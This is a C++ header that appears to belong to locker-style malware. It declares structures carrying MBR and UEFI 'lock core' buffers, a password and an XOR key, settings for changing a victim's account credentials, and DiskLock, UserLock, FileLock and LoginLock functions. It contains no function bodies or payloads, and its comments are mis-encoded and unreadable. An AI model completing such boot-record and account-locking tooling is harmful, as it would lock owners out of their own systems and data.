#include"DiskOperation.h"
#include"others.h"
#include"user.h"
using namespace std;
struct LockCore {
    bool useBuiltInLock = true; // �Ƿ�ʹ��������о��Ĭ��Ϊtrue
    unsigned char color;    // ��ɫ��Ϣ
    char showmsg[128];      // ��ʾ��Ϣ
    char psw[32];           // ����
    unsigned char Xorkey;            //�����Կ 
    unsigned char UefiLockCore[1024]; //UEFI��о
    unsigned char MBRLockCore[512]; //MBR��о
};
struct UserLockSetting
{
    LPWSTR newPassword; // Ҫ���ĵ�����
    bool changeOriginalUsername=true; // �Ǹ���ԭ���˻����û��������½�һ���˻����ҽ���ԭ���˻���Ĭ��Ϊ����ԭ�����û���true
    LPWSTR newUsername; // Ҫ���ĵ��˻�����/Ҫ�½����˻�����
};
struct LoginLockSetting{
    string ShowMsg;
    unsigned char XorKey;
    string password;
    unsigned LockCore[4096]; //�ٳֳ���
};
int DiskLock(LockCore locker);
int UserLock(UserLockSetting setting);
int FileLock(string password);
int LoginLock(LoginLockSetting setting);

